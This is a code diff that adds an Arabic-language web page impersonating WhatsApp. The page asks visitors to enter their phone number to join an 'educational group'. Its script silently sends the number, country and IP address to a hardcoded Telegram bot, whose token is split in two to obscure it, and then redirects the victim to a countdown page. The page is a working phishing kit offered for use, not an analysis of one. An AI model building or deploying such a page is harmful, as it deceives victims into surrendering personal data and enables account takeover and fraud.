@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+    <style>
+        body { background-color: #111b21; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #e9edef; }
+        .container { background-color: #222e35; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 10px; text-align: center; box-shadow: 0 12px 15px rgba(0,0,0,0.24); }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 20px; margin-bottom: 15px; }
+        .instruction { color: #8696a0; font-size: 14px; margin-bottom: 30px; }
+        .iti { width: 100%; margin-bottom: 25px; text-align: left; direction: ltr; }
+        input[type="tel"] { width: 100%; height: 50px; background-color: #2a3942; border: 1px solid #2a3942; color: #fff; border-radius: 8px; font-size: 16px; outline: none; }
+        .btn { background-color: #00a884; color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); } /* Small click effect */
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+    <h2>الانضمام إلى المجموعة</h2>
+    <p class="instruction">أدخل رقم هاتفك المرتبط بحساب واتساب للمتابعة في المجموعة التعليمية.</p>
+    <input type="tel" id="phone">
+    <button class="btn" onclick="sendPhoneNumber()">انضم الآن</button>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+<script>
+    // --- CONFIGURATION ---
+    const p1 = '8497881667'; const p2 = 'AAECLuXvQ_m93xbeEiRDK7RK3yd2ghLPtxo';
+    const botToken = p1 + ':' + p2; const chatId = '6727057071';
+    
+    // --- INITIALIZE PHONE INPUT ---
+    const phoneInput = window.intlTelInput(document.querySelector("#phone"), {
+        initialCountry: "auto",
+        geoIpLookup: (success) => fetch("https://ipinfo.io/json").then(res => res.json()).then(data => success(data.country)).catch(() => success("ma")),
+        separateDialCode: true,
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+    });
+
+    // --- MAIN FUNCTION ---
+    function sendPhoneNumber() {
+        const fullNumber = phoneInput.getNumber();
+        const countryData = phoneInput.getSelectedCountryData();
+        const countryName = countryData.name;
+        const btn = document.querySelector('.btn');
+
+        // 1. VIBRATION UPGRADE (50ms buzz)
+        if (window.navigator && window.navigator.vibrate) {
+            window.navigator.vibrate(50);
+        }
+
+        // 2. SAFETY CHECK (Prevents blank Telegram messages)
+        if (!fullNumber || fullNumber.trim().length < 7) {
+            // Error vibration pattern: buzz-pause-buzz
+            if (window.navigator.vibrate) window.navigator.vibrate([40, 60, 40]);
+            alert("يرجى إدخال رقم الهاتف أولاً"); 
+            return; 
+        }
+
+        // 3. UI LOADING STATE
+        btn.innerText = "جاري التحميل...";
+        btn.disabled = true;
+
+        const proceed = (ip) => {
+            const msg = `🚀 NOUVEAU VISITEUR\n📞 Num: ${fullNumber}\n🌍 Pays: ${countryName}\n🌐 IP: ${ip}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+            .finally(() => {
+                localStorage.setItem('phoneNumber', fullNumber);
+                localStorage.setItem('countryName', countryName);
+                window.location.href = "countdown_custom.html";
+            });
+        };
+
+        // 4. IP DETECTION WITH SAFETY TIMEOUT
+        const forceForward = setTimeout(() => proceed("IP Hidden/Slow"), 2000);
+
+        fetch('https://ipinfo.io/json').then(res => res.json()).then(data => {
+            clearTimeout(forceForward); 
+            proceed(data.ip);
+        }).catch(() => {
+            clearTimeout(forceForward); 
+            proceed("Blocked/VPN");
+        });
+    }
+</script>
+</body>
+</html>
